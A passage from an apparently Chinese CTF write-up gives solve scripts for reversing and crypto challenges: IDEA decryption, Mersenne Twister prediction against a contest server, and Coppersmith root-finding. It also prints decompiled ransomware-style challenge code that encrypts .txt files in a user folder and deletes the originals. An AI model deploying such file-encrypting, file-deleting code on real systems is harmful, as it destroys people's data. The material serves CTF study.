0xCFBA9598, 0x0F00F934, 0x21B4F4B5, 0xE10E9819,\n        0x7BB12BAE, 0xBB0B4702, 0x3B6E20C8, 0xFBD44C64, 0x616BFFD3, 0xA1D1937F, 0x8F659EFE, 0x4FDFF252,\n        0xD56041E5, 0x15DA2D49, 0x88085AE7, 0x48B2364B, 0xD20D85FC, 0x12B7E950, 0x3C03E4D1, 0xFCB9887D,\n        0x66063BCA, 0xA6BC5766, 0x86D3D2D5, 0x4669BE79, 0xDCD60DCE, 0x1C6C6162, 0x32D86CE3, 0xF262004F,\n        0x68DDB3F8, 0xA867DF54, 0x35B5A8FA, 0xF50FC456, 0x6FB077E1, 0xAF0A1B4D, 0x81BE16CC, 0x41047A60,\n        0xDBBBC9D7, 0x1B01A57B, 0xEDB88321, 0x2D02EF8D, 0xB7BD5C3A, 0x77073096, 0x59B33D17, 0x990951BB,\n        0x03B6E20C, 0xC30C8EA0, 0x5EDEF90E, 0x9E6495A2, 0x04DB2615, 0xC4614AB9, 0xEAD54738, 0x2A6F2B94,\n        0xB0D09823, 0x706AF48F, 0x5005713C, 0x90BF1D90, 0x0A00AE27, 0xCABAC28B, 0xE40ECF0A, 0x24B4A3A6,\n        0xBE0B1011, 0x7EB17CBD, 0xE3630B13, 0x23D967BF, 0xB966D408, 0x79DCB8A4, 0x5768B525, 0x97D2D989,\n        0x0D6D6A3E, 0xCDD70692, 0x4DB26158, 0x8D080DF4, 0x17B7BE43, 0xD70DD2EF, 0xF9B9DF6E, 0x3903B3C2,\n        0xA3BC0075, 0x63066CD9, 0xFED41B77, 0x3E6E77DB, 0xA4D1C46C, 0x646BA8C0, 0x4ADFA541, 0x8A65C9ED,\n        0x10DA7A5A, 0xD06016F6, 0xF00F9345, 0x30B5FFE9, 0xAA0A4C5E, 0x6AB020F2, 0x44042D73, 0x84BE41DF,\n        0x1E01F268, 0xDEBB9EC4, 0x4369E96A, 0x83D385C6, 0x196C3671, 0xD9D65ADD, 0xF762575C, 0x37D83BF0,\n        0xAD678847, 0x6DDDE4EB, 0x76DC4190, 0xB6662D3C, 0x2CD99E8B, 0xEC63F227, 0xC2D7FFA6, 0x026D930A,\n        0x98D220BD, 0x58684C11, 0xC5BA3BBF, 0x05005713, 0x9FBFE4A4, 0x5F058808, 0x71B18589, 0xB10BE925,\n        0x2BB45A92, 0xEB0E363E, 0xCB61B38D, 0x0BDBDF21, 0x91646C96, 0x51DE003A, 0x7F6A0DBB, 0xBFD06117,\n        0x256FD2A0, 0xE5D5BE0C, 0x7807C9A2, 0xB8BDA50E, 0x220216B9, 0xE2B87A15, 0xCC0C7794, 0x0CB61B38,\n        0x9609A88F, 0x56B3C423, 0xD6D6A3E9, 0x166CCF45, 0x8CD37CF2, 0x4C69105E, 0x62DD1DDF, 0xA2677173,\n        0x38D8C2C4, 0xF862AE68, 0x65B0D9C6, 0xA50AB56A, 0x3FB506DD, 0xFF0F6A71, 0xD1BB67F0, 0x11010B5C,\n        0x8BBEB8EB, 0x4B04D447, 0x6B6B51F4, 0xABD13D58, 0x316E8EEF, 0xF1D4E243, 0xDF60EFC2, 0x1FDA836E,\n        0x856530D9, 0x45DF5C75, 0xD80D2BDB, 0x18B74777, 0x8208F4C0, 0x42B2986C, 0x6C0695ED, 0xACBCF941,\n        0x36034AF6, 0xF6B9265A, 0xCCCCCCCC, 0xCCCCCC00, 0x00000100, 0x00000000, 0xF6B9265A, 0xCCCCCCCC,\n        0x00000008, 0x00000000};\n\n    uint32_t enc1[]{\n        0x46A95BAD,\n        0x1CAC84B6,\n        0xA67CB2B2,\n        0x32188937,\n        0x4872D39F,\n        0xF2A2E59B,\n        0x011B94D2,\n    };\n\n    // 爆破前7字节\n    for (int i = 0; i < 7; i++)\n    {\n        for (int c = 28; c < 132; c++)\n        {\n            if ((~box1[(uint8_t)c ^ 0x79] ^ 0xB0E0E879) == enc1[i])\n            {\n                printf(\"%c\", c);\n                break;\n            }\n        }\n    }\n```\n\n得到前七个字符为：**moshui_**\n\n第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。\n\n![](/images/57-1744626745339-63.png)\n\n![](/images/58-1744626745339-62.png)\n\n开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。\n\n由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。\n\n密钥：**0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF**\n\n![](/images/59-1744626745339-64.png)\n\n然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为'}'，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。\n\n![](/images/60-1744626745339-65.png)\n\n加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。\n\n利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。\n\n![](/images/61-1744626745339-66.png)\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <bitset>\n#include <cmath>\n#include <windows.h>\n#include <algorithm>\nusing namespace std;\n\ntypedef bitset<16> code;\ntypedef bitset<128> key;\n\nbitset<16> sub_key[52];\nbitset<16> inv_sub_key[52];\n\ncode XOR(code code_1, code code_2)\n{\n    return code_1 ^ code_2;\n}\n\ncode Plus(code code_1, code code_2)\n{\n    int tmp = 0;\n    for (int i = 0; i < 16; i++)\n    {\n        tmp += code_1[i] * pow(2, i) + code_2[i] * pow(2, i);\n    }\n    tmp %= 65536;\n    return bitset<16>(tmp);\n}\n\ncode invPlus(code code_in)\n{\n    int tmp = 0;\n    for (int i = 0; i < 16; i++)\n        tmp += code_in[i] * pow(2, i);\n    tmp = 65536 - tmp;\n    return bitset<16>(tmp);\n}\n\ncode Times(code code_1, code code_2)\n{\n    long long tmp_1 = 0, tmp_2 = 0;\n    for (int i = 0; i < 16; i++)\n    {\n        tmp_1 += code_1[i] * pow(2, i);\n        tmp_2 += code_2[i] * pow(2, i);\n    }\n    if (tmp_1 == 0)\n        tmp_1 = 65536;\n    if (tmp_2 == 0)\n        tmp_2 = 65536;\n    long long tmp = (tmp_1 * tmp_2) % 65537;\n    return bitset<16>(tmp == 65536 ? 0 : tmp);\n}\n\nvoid Exgcd(int a, int b, int &x, int &y)\n{\n    if (!b)\n        x = 1, y = 0;\n    else\n        Exgcd(b, a % b, y, x), y -= a / b * x;\n}\n\ncode invTimes(code code_in)\n{\n    int tmp = 0;\n    for (int i = 0; i < 16; i++)\n        tmp += code_in[i] * pow(2, i);\n    int x, y;\n    int p = 65537;\n    Exgcd(tmp, p, x, y);\n    x = (x % p + p) % p;\n    return bitset<16>(x);\n}\n\nvoid subkeys_get(code keys_input[8])\n{\n    key keys;\n    for (int i = 0; i < 8; i++)\n        for (int j = 0; j < 16; j++)\n            keys[j + 16 * i] = keys_input[7 - i][j];\n\n    for (int i = 0; i < 8; i++)\n        for (int j = 0; j < 16; j++)\n            sub_key[i][15 - j] = keys[127 - (j + 16 * i)];\n\n    for (int i = 0; i < 5; i++)\n    {\n        key tmp_keys = keys >> 103;\n        keys = (keys << 25) | tmp_keys;\n        for (int j = (8 + 8 * i); j < (8 * (i + 2)); j++)\n            for (int k = 0; k < 16; k++)\n                sub_key[j][15 - k] = keys[127 - (k + 16 * (j - 8 - 8 * i))];\n    }\n\n    key tmp_keys = keys >> 103;\n    keys = (keys << 25) | tmp_keys;\n    for (int i = 48; i < 52; i++)\n        for (int j = 0; j < 16; j++)\n            sub_key[i][15 - j] = keys[127 - (j + 16 * (i - 48))];\n}\n\nvoid inv_subkeys_get(code sub_key[52])\n{\n    for (int i = 6; i < 48; i += 6)\n    {\n        inv_sub_key[i] = invTimes(sub_key[48 - i]);\n        inv_sub_key[i + 1] = invPlus(sub_key[50 - i]);\n        inv_sub_key[i + 2] = invPlus(sub_key[49 - i]);\n        inv_sub_key[i + 3] = invTimes(sub_key[51 - i]);\n    }\n\n    for (int i = 0; i < 48; i += 6)\n    {\n        inv_sub_key[i + 4] = sub_key[46 - i];\n        inv_sub_key[i + 5] = sub_key[47 - i];\n    }\n\n    inv_sub_key[0] = invTimes(sub_key[48]);\n    inv_sub_key[1] = invPlus(sub_key[49]);\n    inv_sub_key[2] = invPlus(sub_key[50]);\n    inv_sub_key[3] = invTimes(sub_key[51]);\n\n    inv_sub_key[48] = invTimes(sub_key[0]);\n    inv_sub_key[49] = invPlus(sub_key[1]);\n    inv_sub_key[50] = invPlus(sub_key[2]);\n    inv_sub_key[51] = invTimes(sub_key[3]);\n}\n\nbitset<64> dencrypt(bitset<64> cipher)\n{\n    bitset<16> I_1, I_2, I_3, I_4;\n    for (int i = 0; i < 16; i++)\n    {\n        I_1[15 - i] = cipher[63 - i];\n        I_2[15 - i] = cipher[47 - i];\n        I_3[15 - i] = cipher[31 - i];\n        I_4[i] = cipher[i];\n    }\n    for (int i = 0; i < 48; i += 6)\n    {\n        bitset<16> tmp_1 = Times(inv_sub_key[i], I_1);\n        bitset<16> tmp_2 = Plus(inv_sub_key[i + 1], I_2);\n        bitset<16> tmp_3 = Plus(inv_sub_key[i + 2], I_3);\n        bitset<16> tmp_4 = Times(inv_sub_key[i + 3], I_4);\n        bitset<16> tmp_5 = XOR(tmp_1, tmp_3);\n        bitset<16> tmp_6 = XOR(tmp_2, tmp_4);\n        bitset<16> tmp_7 = Times(inv_sub_key[i + 4], tmp_5);\n        bitset<16> tmp_8 = Plus(tmp_6, tmp_7);\n        bitset<16> tmp_9 = Times(tmp_8, inv_sub_key[i + 5]);\n        bitset<16> tmp_10 = Plus(tmp_7, tmp_9);\n        I_1 = XOR(tmp_1, tmp_9);\n        I_2 = XOR(tmp_3, tmp_9);\n        I_3 = XOR(tmp_2, tmp_10);\n        I_4 = XOR(tmp_4, tmp_10);\n    }\n    bitset<16> Y_1 = Times(I_1, inv_sub_key[48]);\n    bitset<16> Y_2 = Plus(I_3, inv_sub_key[49]);\n    bitset<16> Y_3 = Plus(I_2, inv_sub_key[50]);\n    bitset<16> Y_4 = Times(I_4, inv_sub_key[51]);\n\n    bitset<64> plaint;\n    for (int i = 0; i < 16; i++)\n    {\n        plaint[i] = Y_4[i];\n        plaint[i + 16] = Y_3[i];\n        plaint[i + 32] = Y_2[i];\n        plaint[i + 48] = Y_1[i];\n    }\n    return plaint;\n}\n\nint main()\n{\n    unsigned int box1[] = {\n        0x00000000, 0xC0BA6CAC, 0x5A05DF1B, 0x9ABFB3B7, 0xB40BBE36, 0x74B1D29A,\n        0xEE0E612D, 0x2EB40D81, 0xB3667A2F, 0x73DC1683, 0xE963A534, 0x29D9C998, 0x076DC419, 0xC7D7A8B5,\n        0x5D681B02, 0x9DD277AE, 0xBDBDF21D, 0x7D079EB1, 0xE7B82D06, 0x270241AA, 0x09B64C2B, 0xC90C2087,\n        0x53B39330, 0x9309FF9C, 0x0EDB8832, 0xCE61E49E, 0x54DE5729, 0x94643B85, 0xBAD03604, 0x7A6A5AA8,\n        0xE0D5E91F, 0x206F85B3, 0xA00AE279, 0x60B08ED5, 0xFA0F3D62, 0x3AB551CE, 0x14015C4F, 0xD4BB30E3,\n        0x4E048354, 0x8EBEEFF8, 0x136C9856, 0xD3D6F4FA, 0x4969474D, 0x89D32BE1, 0xA7672660, 0x67DD4ACC,\n        0xFD62F97B, 0x3DD895D7, 0x1DB71064, 0xDD0D7CC8, 0x47B2CF7F, 0x8708A3D3, 0xA9BCAE52, 0x6906C2FE,\n        0xF3B97149, 0x33031DE5, 0xAED16A4B, 0x6E6B06E7, 0xF4D4B550, 0x346ED9FC, 0x1ADAD47D, 0xDA60B8D1,\n        0x40DF0B66, 0x806567CA, 0x9B64C2B1, 0x5BDEAE1D, 0xC1611DAA, 0x01DB7106, 0x2F6F7C87, 0xEFD5102B,\n        0x756AA39C, 0xB5D0CF30, 0x2802B89E, 0xE8B8D432, 0x72076785, 0xB2BD0B29, 0x9C0906A8, 0x5CB36A04,\n        0xC60CD9B3, 0x06B6B51F, 0x26D930AC, 0xE6635C00, 0x7CDCEFB7, 0xBC66831B, 0x92D28E9A, 0x5268E236,\n        0xC8D75181, 0x086D3D2D, 0x95BF4A83, 0x5505262F, 0xCFBA9598, 0x0F00F934, 0x21B4F4B5, 0xE10E9819,\n        0x7BB12BAE, 0xBB0B4702, 0x3B6E20C8, 0xFBD44C64, 0x616BFFD3, 0xA1D1937F, 0x8F659EFE, 0x4FDFF252,\n        0xD56041E5, 0x15DA2D49, 0x88085AE7, 0x48B2364B, 0xD20D85FC, 0x12B7E950, 0x3C03E4D1, 0xFCB9887D,\n        0x66063BCA, 0xA6BC5766, 0x86D3D2D5, 0x4669BE79, 0xDCD60DCE, 0x1C6C6162, 0x32D86CE3, 0xF262004F,\n        0x68DDB3F8, 0xA867DF54, 0x35B5A8FA, 0xF50FC456, 0x6FB077E1, 0xAF0A1B4D, 0x81BE16CC, 0x41047A60,\n        0xDBBBC9D7, 0x1B01A57B, 0xEDB88321, 0x2D02EF8D, 0xB7BD5C3A, 0x77073096, 0x59B33D17, 0x990951BB,\n        0x03B6E20C, 0xC30C8EA0, 0x5EDEF90E, 0x9E6495A2, 0x04DB2615, 0xC4614AB9, 0xEAD54738, 0x2A6F2B94,\n        0xB0D09823, 0x706AF48F, 0x5005713C, 0x90BF1D90, 0x0A00AE27, 0xCABAC28B, 0xE40ECF0A, 0x24B4A3A6,\n        0xBE0B1011, 0x7EB17CBD, 0xE3630B13, 0x23D967BF, 0xB966D408, 0x79DCB8A4, 0x5768B525, 0x97D2D989,\n        0x0D6D6A3E, 0xCDD70692, 0x4DB26158, 0x8D080DF4, 0x17B7BE43, 0xD70DD2EF, 0xF9B9DF6E, 0x3903B3C2,\n        0xA3BC0075, 0x63066CD9, 0xFED41B77, 0x3E6E77DB, 0xA4D1C46C, 0x646BA8C0, 0x4ADFA541, 0x8A65C9ED,\n        0x10DA7A5A, 0xD06016F6, 0xF00F9345, 0x30B5FFE9, 0xAA0A4C5E, 0x6AB020F2, 0x44042D73, 0x84BE41DF,\n        0x1E01F268, 0xDEBB9EC4, 0x4369E96A, 0x83D385C6, 0x196C3671, 0xD9D65ADD, 0xF762575C, 0x37D83BF0,\n        0xAD678847, 0x6DDDE4EB, 0x76DC4190, 0xB6662D3C, 0x2CD99E8B, 0xEC63F227, 0xC2D7FFA6, 0x026D930A,\n        0x98D220BD, 0x58684C11, 0xC5BA3BBF, 0x05005713, 0x9FBFE4A4, 0x5F058808, 0x71B18589, 0xB10BE925,\n        0x2BB45A92, 0xEB0E363E, 0xCB61B38D, 0x0BDBDF21, 0x91646C96, 0x51DE003A, 0x7F6A0DBB, 0xBFD06117,\n        0x256FD2A0, 0xE5D5BE0C, 0x7807C9A2, 0xB8BDA50E, 0x220216B9, 0xE2B87A15, 0xCC0C7794, 0x0CB61B38,\n        0x9609A88F, 0x56B3C423, 0xD6D6A3E9, 0x166CCF45, 0x8CD37CF2, 0x4C69105E, 0x62DD1DDF, 0xA2677173,\n        0x38D8C2C4, 0xF862AE68, 0x65B0D9C6, 0xA50AB56A, 0x3FB506DD, 0xFF0F6A71, 0xD1BB67F0, 0x11010B5C,\n        0x8BBEB8EB, 0x4B04D447, 0x6B6B51F4, 0xABD13D58, 0x316E8EEF, 0xF1D4E243, 0xDF60EFC2, 0x1FDA836E,\n        0x856530D9, 0x45DF5C75, 0xD80D2BDB, 0x18B74777, 0x8208F4C0, 0x42B2986C, 0x6C0695ED, 0xACBCF941,\n        0x36034AF6, 0xF6B9265A, 0xCCCCCCCC, 0xCCCCCC00, 0x00000100, 0x00000000, 0xF6B9265A, 0xCCCCCCCC,\n        0x00000008, 0x00000000};\n\n    uint32_t enc1[]{\n        0x46A95BAD,\n        0x1CAC84B6,\n        0xA67CB2B2,\n        0x32188937,\n        0x4872D39F,\n        0xF2A2E59B,\n        0x011B94D2,\n    };\n\n    // 爆破前7字节\n    for (int i = 0; i < 7; i++)\n    {\n        for (int c = 28; c < 132; c++)\n        {\n            if ((~box1[(uint8_t)c ^ 0x79] ^ 0xB0E0E879) == enc1[i])\n            {\n                printf(\"%c\", c);\n                break;\n            }\n        }\n    }\n\n    // 后16字节进行IDEA解密\n    unsigned char enc2[16] = {\n        0x5C, 0x2F, 0xD0, 0xEC, 0x82, 0x0E, 0x67, 0x57,\n        0x6A, 0x9F, 0x91, 0xF6, 0x95, 0xA4, 0xAC, 0x90};\n    // unsigned int key[4] = {\n    //     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF};\n    unsigned int key[4] = {\n        0x6C98B242, 0x78563412, 0x3E6A6D0D, 0xEFCDAB89};\n\n    code keys_input[8];\n    for (int i = 0; i < 4; i++)\n    {\n        keys_input[2 * i + 1] = key[i] & 0xFFFF;\n        keys_input[2 * i] = (key[i] >> 16) & 0xFFFF;\n    }\n\n    unsigned char result[16];\n    bitset<64> cipher1, cipher2;\n    for (int i = 0; i < 8; i++)\n    {\n        for (int j = 0; j < 8; j++)\n        {\n            cipher1[63 - (i * 8 + j)] = (enc2[i] >> (7 - j)) & 1;\n            cipher2[63 - (i * 8 + j)] = (enc2[i + 8] >> (7 - j)) & 1;\n        }\n    }\n    subkeys_get(keys_input);\n    inv_subkeys_get(sub_key);\n\n    bitset<64> plain1 = dencrypt(cipher1);\n    bitset<64> plain2 = dencrypt(cipher2);\n\n    uint64_t plain1_val = plain1.to_ullong();\n    uint64_t plain2_val = plain2.to_ullong();\n\n    uint8_t dec2[16]{};\n    memcpy(dec2, &plain2_val, 8);\n    memcpy(dec2 + 8, &plain1_val, 8);\n    reverse(dec2, dec2 + 16);\n\n    printf(\"%.16s\\n\", dec2);\n    return 0;\n}\n```\n\nflag{moshui_build_this_block}\n\n\n\n## Crypto\n\n### Division\n\n```python\nwhile True:\n    choose = input(': >>> ')\n    if choose == '1':\n        try:\n            denominator = int(input('input the denominator: >>> '))\n        except:\n            print('INPUT NUMBERS')\n            continue\n        nominator = random.getrandbits(32)\n        if denominator == '0':\n            print('NO YOU DONT')\n            continue\n        else:\n            print(f'{nominator}//{denominator} = {nominator//denominator}')\n\n```\n\n题目可以任意获取32字节的数据，直接使用现有的mt19937攻击库即可预测随机数\n\n```python\nfrom pwn import *\nfrom randcrack import RandCrack\nfrom tqdm import tqdm\n\ncontext.log_level = 'debug'\nsh=remote(\"47.94.217.82\",28739 )\ndata=[]\nfor i in range(624):\n    sh.recvuntil(b'>>> ')\n    sh.sendline(b'1')\n    sh.recvuntil(b'tor: >>> ')\n    sh.sendline(b'1')\n    line=int(sh.recvline().decode().split('=')[1].replace('\\n', '').replace(' ', ''))\n    data.append(line)\n\nprint(data)\n\n\nRC = RandCrack()\nfor i in data:\n    RC.submit(i)\n\nsh.sendline(b'2')\nsh.recvuntil(b'er: >>>')\nrand1 = RC.predict_getrandbits(11000)\nrand2 = RC.predict_getrandbits(10000)\ncorrect_ans = rand1 // rand2\n\nsh.sendline(str(correct_ans).encode())\nsh.recvlines()  \n```\n\n> XYCTF{4c4e5327-9cd0-4fb6-b584-878afdffb850}\n\n### Complex_signin\n\n题目构造了复数对象，混淆了m的实部和虚部的低128位,已知\n\n![cry1](/images/cry1-1744626745339-67.png)\n\n二元copper解低位即可\n\n```python\nfrom Crypto.Util.number import *\nfrom Crypto.Cipher import ChaCha20\nimport hashlib\nimport itertools\n\ndef small_roots(f, bounds, m=1, d=None):\n    if not d:\n        d = f.degree()\n\n    R = f.base_ring()\n    N = R.cardinality()\n\n    f /= f.coefficients().pop(0)\n    f = f.change_ring(ZZ)\n\n    G = Sequence([], f.parent())\n    for i in range(m + 1):\n        base = N ^ (m - i) * f ^ i\n        for shifts in itertools.product(range(d), repeat=f.nvariables()):\n            g = base * prod(map(power, f.variables(), shifts))\n            G.append(g)\n\n    B, monomials = G.coefficient_matrix()\n    monomials = vector(monomials)\n\n    factors = [monomial(*bounds) for monomial in monomials]\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, factor)\n\n    B = B.dense_matrix().LLL()\n\n    B = B.change_ring(QQ)\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, 1 / factor)\n\n    H = Sequence([], f.parent().change_ring(QQ))\n    for h in filter(None, B * monomials):\n        H.append(h)\n        I = H.ideal()\n        if I.dimension() == -1:\n            H.pop()\n        elif I.dimension() == 0:\n            roots = []\n            for root in I.variety(ring=ZZ):\n                root = tuple(R(root[var]) for var in f.variables())\n                roots.append(root)\n            return roots\n\n    return []\n\n\nclass Complex:\n    def __init__(self, re, im):\n        self.re = re\n        self.im = im\n\n    def __mul__(self, c):\n        re_ = self.re * c.re - self.im * c.im\n        im_ = self.re * c.im + self.im * c.re\n        return Complex(re_, im_)\n\n    def __eq__(self, c):\n        return self.re == c.re and self.im == c.im\n\n    def __rshift__(self, m):\n        return Complex(self.re >> m, self.im >> m)\n\n    def __lshift__(self, m):\n        return Complex(self.re << m, self.im << m)\n\n    def __str__(self):\n        if self.im == 0:\n            return str(self.re)\n        elif self.re == 0:\n            if abs(self.im) == 1:\n                return f\"{'-' if self.im < 0 else ''}i\"\n            else:\n                return f\"{self.im}i\"\n        else:\n            return f\"{self.re} {'+' if self.im > 0 else '-'} {abs(self.im)}i\"\n\n    def tolist(self):\n        return [self.re, self.im]\n\n\ndef complex_pow(c, exp, n):\n    result = Complex(1, 0)\n    while exp > 0:\n        if exp & 1:\n            result = result * c\n            result.re = result.re % n\n            result.im = result.im % n\n        c = c * c\n        c.re = c.re % n\n        c.im = c.im % n\n        exp >>= 1\n    return result\n\nn = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753\nmh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]\nC = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]\nenc = b'\\x9c\\xc4n\\x8dF\\xd9\\x9e\\xf4\\x05\\x82!\\xde\\xfe\\x012$\\xd0\\x8c\\xaf\\xfb\\rEb(\\x04)\\xa1\\xa6\\xbaI2J\\xd2\\xb2\\x898\\x11\\xe6x\\xa9\\x19\\x00pn\\xf6rs- \\xd2\\xd1\\xbe\\xc7\\xf51.\\xd4\\xd2 \\xe7\\xc6\\xca\\xe5\\x19\\xbe'\n\nPR.<x,y>=Zmod(int(n))[]\na=mh[0]+x\nb=mh[1]+y\nf1=a^3-3*a*b^2-C[0]\n\nroots=small_roots(f1,bounds=(2**129,2**129),m=5,d=3)\nprint(roots[0])\n\nm=Complex(mh[0]+roots[0][0],mh[1]+roots[0][1])\nprint(str(m.re + m.im))\n\ndec=ChaCha20.new(key=hashlib.sha256(str(m.re + m.im).encode()).digest(), nonce=b'Pr3d1ctmyxjj')\nprint(dec.decrypt(enc))\n```\n\n> XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}\n\n### 勒索病毒\n\n题目给出了exe和加密的16进制数据\n\npyinstxtractor反编译一下，编译task.pyc看到注释的代码\n\n```python\nimport re\nimport base64\nimport os\nimport sys\nfrom gmssl import sm4\nfrom Crypto.Util.Padding import pad\nimport binascii\nfrom random import shuffle, randrange\n\nN = 49 \np = 3\nq = 128  \nd = 3\nassert q > (6 * d + 1) * p\nR.<x> = ZZ[]\ndef generate_T(d1, d2):\n    assert N >= d1 + d2\n    s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2)\n    shuffle(s)\n    return R(s)\n\ndef invert_mod_prime(f, p):\n    Rp = R.change_ring(Integers(p)).quotient(x^N - 1)\n    return R(lift(1 / Rp(f)))\n\ndef convolution(f, g):\n    return (f * g) % (x^N - 1)\n\ndef lift_mod(f, q):\n    return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)])\n\ndef poly_mod(f, q):\n    return R([f[i] % q for i in range(N)])\n\ndef invert_mod_pow2(f, q):\n    assert q.is_power_of(2)\n    g = invert_mod_prime(f, 2)\n    while True:\n        r = lift_mod(convolution(g, f), q)\n        if r == 1:\n            return g\n        g = lift_mod(convolution(g, 2 - r), q)\n\ndef generate_message():\n    return R([randrange(p) - 1 for _ in range(N)])\n\ndef generate_key():\n    while True:\n        try:\n            f = generate_T(d + 1, d)\n            g = generate_T(d, d)\n            Fp = poly_mod(invert_mod_prime(f, p), p)\n            Fq = poly_mod(invert_mod_pow2(f, q), q)\n            break\n        except:\n            continue\n    h = poly_mod(convolution(Fq, g), q)\n    return h, (f, g)\n\ndef encrypt_message(m, h):\n    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)\n    return e\n\ndef save_ntru_keys():\n    h, secret = generate_key()\n    with open(\"pub_key.txt\", \"w\") as f:\n        f.write(str(h))\n    m = generate_message()\n    with open(\"priv_key.txt\", \"w\") as f:\n        f.write(str(m))\n    e = encrypt_message(m, h)\n    with open(\"enc.txt\", \"w\") as f:\n        f.write(str(e))\n\ndef terms(poly_str):\n    terms = []\n    pattern = r'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)'\n    matches = re.finditer(pattern, poly_str.replace(' ', ''))\n\n    for match in matches:\n        term = match.group()\n        if term == '+x' or term == 'x':\n            terms.append(1)\n        elif term == '-x':\n            terms.append(-1)\n        elif 'x^' in term:\n            coeff_part = term.split('x^')[0]\n            exponent = int(term.split('x^')[1])\n            if not coeff_part or coeff_part == '+':\n                coeff = 1\n            elif coeff_part == '-':\n                coeff = -1\n            else:\n                coeff = int(coeff_part)\n            terms.append(coeff * exponent)\n        elif 'x' in term:\n            coeff_part = term.split('x')[0]\n            if not coeff_part or coeff_part == '+':\n                terms.append(1)\n            elif coeff_part == '-':\n                terms.append(-1)\n            else:\n                terms.append(int(coeff_part))\n        else:\n            if term == '+1' or term == '1':\n                terms.append(0)\n                terms.append(-0)\n    return terms\n\ndef gen_key(poly_terms):\n    binary = [0] * 128\n    for term in poly_terms:\n        exponent = abs(term)\n        if term > 0 and exponent <= 127:  \n            binary[127 - exponent] = 1\n    binary_str = ''.join(map(str, binary))\n    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)\n    return hex_key\n\ndef read_polynomial_from_file(filename):\n    with open(filename, 'r') as file:\n        return file.read().strip()\n\ndef sm4_encrypt(key, plaintext):\n    assert len(key) == 16, \"SM4 key must be 16 bytes\"\n    cipher = sm4.CryptSM4()\n    cipher.set_key(key, sm4.SM4_ENCRYPT)\n    padded_plaintext = pad(plaintext, 16)\n    return cipher.crypt_ecb(padded_plaintext)\n\ndef sm4_encrypt_file(input_path, output_path, key):\n    with open(input_path, 'rb') as f:\n        plaintext = f.read()\n    \n    ciphertext = sm4_encrypt(key, plaintext)\n    \n    with open(output_path, 'wb') as f:\n        f.write(ciphertext)\n\ndef resource_path(relative_path):\n    if getattr(sys, 'frozen', False):\n        base_path = sys._MEIPASS\n    else:\n        base_path = os.path.abspath(\".\")\n    return os.path.join(base_path, relative_path)\n\ndef encrypt_directory(directory, sm4_key, extensions=[\".txt\"]):\n    if not os.path.exists(directory):\n        print(f\"Directory does not exist: {directory}\")\n        return\n    \n    for root, _, files in os.walk(directory):\n        for file in files:\n            if any(file.endswith(ext) for ext in extensions):\n                input_path = os.path.join(root, file)\n                output_path = input_path + \".enc\"\n                \n                try:\n                    sm4_encrypt_file(input_path, output_path, sm4_key)\n                    os.remove(input_path)\n                    print(f\"Encrypted: {input_path} -> {output_path}\")\n                except Exception as e:\n                    print(f\"Error encrypting {input_path}: {str(e)}\")\n\ndef main():\n    try:\n        save_ntru_keys()\n        poly_str = read_polynomial_from_file(\"priv_key.txt\")\n        poly_terms = terms(poly_str)\n        sm4_key = binascii.unhexlify(poly_terms)\n        user_name = os.getlogin()\n        target_dir = os.path.join(\"C:\\Users\", user_name, \"Desktop\", \"test_files\")\n        \n        if not os.path.exists(target_dir):\n            os.makedirs(target_dir, exist_ok=True)\n            print(f\"Created directory: {target_dir}\")\n            return\n            \n        txt_files = [f 